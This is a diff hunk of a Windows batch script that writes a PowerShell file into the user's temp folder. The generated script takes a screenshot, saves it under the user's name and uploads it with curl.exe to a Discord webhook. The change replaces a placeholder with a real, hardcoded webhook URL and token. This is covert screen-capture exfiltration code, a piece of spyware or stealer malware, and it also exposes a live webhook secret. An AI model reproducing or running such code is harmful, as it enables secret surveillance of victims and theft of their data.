@@ -20,7 +20,7 @@ echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
 echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1			
 echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
 echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
-echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
+echo $result  = "https://discord.com/api/webhooks/1277251946432041000/jE0OupMT6KbRbJ2rCGuFVks3M66TSlGSV_5zr8rWB9ddJx8Vj671d4haAwhfD5wqW_AS"  >>%userprofile%\AppData\Local\Temp\test.ps1
 echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
 echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
 timeout 1 >NUL
